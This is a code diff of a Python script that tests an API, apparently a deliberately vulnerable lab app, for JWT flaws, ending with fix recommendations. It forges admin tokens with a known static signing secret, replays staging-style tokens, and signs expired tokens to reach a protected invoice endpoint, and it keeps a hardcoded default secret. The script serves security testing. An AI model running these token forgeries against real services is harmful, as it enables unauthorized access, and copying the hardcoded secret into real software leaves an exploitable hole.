@@ -1,11 +1,18 @@
-import jwt
-import requests
 import json
+import os
 from datetime import datetime, timedelta
 
+import jwt
+import requests
+from dotenv import load_dotenv
+
+# Load environment variables
+load_dotenv()
+
 # Configuration
-API_BASE = "http://10.0.0.105:3001"  # Docker host IP and correct port
-JWT_SECRET = "your-jwt-secret-key-2024"  # The static key from our vulnerable implementation
+API_BASE = os.getenv("API_URL", "http://localhost:3001")
+JWT_SECRET = os.getenv("JWT_SECRET", "your-jwt-secret-key-2024")
+
 
 class JWTVulnerabilityTest:
     def __init__(self):
@@ -17,7 +24,7 @@ class JWTVulnerabilityTest:
         """Register a new user"""
         response = requests.post(
             f"{API_BASE}/api/auth/register",
-            json={"username": username, "password": password}
+            json={"username": username, "password": password},
         )
         print(f"Register {username}: {response.status_code}")
         print(f"Response: {response.text}")
@@ -27,7 +34,7 @@ class JWTVulnerabilityTest:
         """Login and get JWT token"""
         response = requests.post(
             f"{API_BASE}/api/auth/login",
-            json={"username": username, "password": password}
+            json={"username": username, "password": password},
         )
         print(f"Login {username}: {response.status_code}")
         print(f"Response: {response.text}")
@@ -40,14 +47,14 @@ class JWTVulnerabilityTest:
             "username": user_data.get("username", "fake_user"),
             "role": role,
             "iat": datetime.utcnow(),
-            "exp": datetime.utcnow() + timedelta(days=1)
+            "exp": datetime.utcnow() + timedelta(days=1),
         }
         return jwt.encode(payload, JWT_SECRET, algorithm="HS256")
 
     def test_normal_flow(self):
         """Test normal authentication flow"""
         print("\n=== Testing Normal Authentication Flow ===")
-        
+
         # Register users
         self.register_user("normal_user", "password123")
         self.register_user("admin_user", "admin123")
@@ -67,39 +74,44 @@ class JWTVulnerabilityTest:
 
         # Create a forged admin token
         forged_token = self.create_forged_token(
-            {"username": "forged_admin"},
-            role="admin"
+            {"username": "forged_admin"}, role="admin"
         )
 
         # Try to access protected endpoint with forged token
         headers = {"Authorization": f"Bearer {forged_token}"}
         response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
-        
+
         print(f"Access with forged token: {response.status_code}")
         print(f"Response: {response.text}")
         if response.status_code == 200:
-            print("⚠️ VULNERABILITY: Successfully accessed protected endpoint with forged token!")
+            print(
+                "⚠️ VULNERABILITY: Successfully accessed protected endpoint with forged token!"
+            )
         return response.status_code == 200
 
     def test_cross_environment(self):
         """Test cross-environment token reuse"""
         print("\n=== Testing Cross-Environment Token Reuse ===")
-        
+
         # In real scenario, this token would be from staging/dev environment
         # Here we simulate by creating a token with staging claims
-        staging_token = jwt.encode({
-            "id": "staging_user_id",
-            "username": "staging_user",
-            "role": "admin",
-            "env": "staging",
-            "iat": datetime.utcnow(),
-            "exp": datetime.utcnow() + timedelta(days=1)
-        }, JWT_SECRET, algorithm="HS256")
+        staging_token = jwt.encode(
+            {
+                "id": "staging_user_id",
+                "username": "staging_user",
+                "role": "admin",
+                "env": "staging",
+                "iat": datetime.utcnow(),
+                "exp": datetime.utcnow() + timedelta(days=1),
+            },
+            JWT_SECRET,
+            algorithm="HS256",
+        )
 
         # Try to use staging token in production
         headers = {"Authorization": f"Bearer {staging_token}"}
         response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
-        
+
         print(f"Access with staging token: {response.status_code}")
         print(f"Response: {response.text}")
         if response.status_code == 200:
@@ -109,41 +121,48 @@ class JWTVulnerabilityTest:
     def test_token_expiration_bypass(self):
         """Test token expiration bypass"""
         print("\n=== Testing Token Expiration Bypass ===")
-        
+
         # Create an expired token but sign it with the known key
-        expired_token = jwt.encode({
-            "id": "expired_user_id",
-            "username": "expired_user",
-            "role": "admin",
-            "iat": datetime.utcnow() - timedelta(days=2),
-            "exp": datetime.utcnow() - timedelta(days=1)
-        }, JWT_SECRET, algorithm="HS256")
+        expired_token = jwt.encode(
+            {
+                "id": "expired_user_id",
+                "username": "expired_user",
+                "role": "admin",
+                "iat": datetime.utcnow() - timedelta(days=2),
+                "exp": datetime.utcnow() - timedelta(days=1),
+            },
+            JWT_SECRET,
+            algorithm="HS256",
+        )
 
         # Try to use expired token
         headers = {"Authorization": f"Bearer {expired_token}"}
         response = requests.get(f"{API_BASE}/api/invoice/all", headers=headers)
-        
+
         print(f"Access with expired token: {response.status_code}")
         print(f"Response: {response.text}")
         if response.status_code == 200:
             print("⚠️ VULNERABILITY: Successfully bypassed token expiration!")
         return response.status_code == 200
 
+
 def main():
     tester = JWTVulnerabilityTest()
-    
+
     # Run tests
     try:
         tester.test_normal_flow()
-        vulnerabilities_found = sum([
-            tester.test_token_forgery(),
-            tester.test_cross_environment(),
-            tester.test_token_expiration_bypass()
-        ])
-        
+        vulnerabilities_found = sum(
+            [
+                tester.test_token_forgery(),
+                tester.test_cross_environment(),
+                tester.test_token_expiration_bypass(),
+            ]
+        )
+
         print(f"\n=== Test Summary ===")
         print(f"Vulnerabilities exploited: {vulnerabilities_found}/3")
-        
+
         if vulnerabilities_found > 0:
             print("\n⚠️ SECURITY ALERT: JWT implementation is vulnerable!")
             print("Recommendations:")
@@ -153,9 +172,10 @@ def main():
             print("4. Add proper token validation and revocation")
         else:
             print("\n✅ JWT implementation appears to be secure")
-            
+
     except Exception as e:
         print(f"Error during testing: {str(e)}")
 
+
 if __name__ == "__main__":
-    main() 
+    main()
